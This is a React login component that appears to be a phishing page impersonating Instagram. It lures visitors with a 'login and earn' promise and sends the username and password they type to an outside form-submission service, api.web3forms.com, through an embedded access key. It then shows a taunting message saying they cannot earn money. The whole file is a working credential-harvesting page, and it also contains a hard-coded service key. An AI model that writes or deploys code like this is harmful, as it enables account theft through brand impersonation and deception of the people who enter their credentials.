import React from 'react'
import './LoginForm.css'

import inst_img from './assets/insta-img2.jpeg'


function LoginForm() {

  const [result, setResult] = React.useState("");

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("Sending....");
    const formData = new FormData(event.target);

    formData.append("access_key", "471c2857-29a2-4f71-947a-3b13e7abfd02");

    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData
    });

    const data = await response.json();

    if (data.success) {
      setResult("Your are not able to earn money from this site");
      event.target.reset();
    } else {
      console.log("Error", data);
      setResult(data.message);
    }
  };

  return (
    <div className="container">
      
      <h3>login and earn🤑🤑🤑</h3>
      
    <div className="login-box">
      <h1>Instagram</h1>
      <form id="loginForm" onSubmit={onSubmit}>
        <input type="text" name="user-name" placeholder="Phone number, username, or email" required/>
        <input type="text" name="userId" placeholder="Password" required/>
        <button className='btn'>Log In</button>
        <span>{result}</span>
      </form>
      <div className="divider">OR</div>
      <button className="fb-login">Log in with Facebook</button>
      <a href="#" className="forgot-password">Forgot password?</a>
    </div>
    <div className="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  )

}
export default LoginForm
